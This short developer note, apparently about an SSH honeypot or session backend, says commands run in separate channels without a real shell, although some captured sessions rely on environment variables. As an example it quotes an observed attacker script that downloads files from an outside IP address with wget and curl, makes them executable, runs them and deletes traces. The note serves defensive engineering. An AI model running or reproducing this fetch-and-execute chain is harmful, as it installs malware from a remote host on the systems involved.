Currently we open independent channels for each command, without getting an actual shell. Some ssh sessions seen in production however rely on environment variables. This is an example: 

#!/bin/sh 
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://182.52.51.215/scripts/23s; curl -O http://182.52.51.215/scripts/23s; chmod +x 23s; ./23s; wget http://182.52.51.215/scripts/23; curl -O http://182.52.51.215/scripts/23; chmod +x 23; ./23; rm -rf 23.sh; /bin/eyshcjdmzg; ls -la /var/run/gcc.pid;

The first command has no effect in our backend
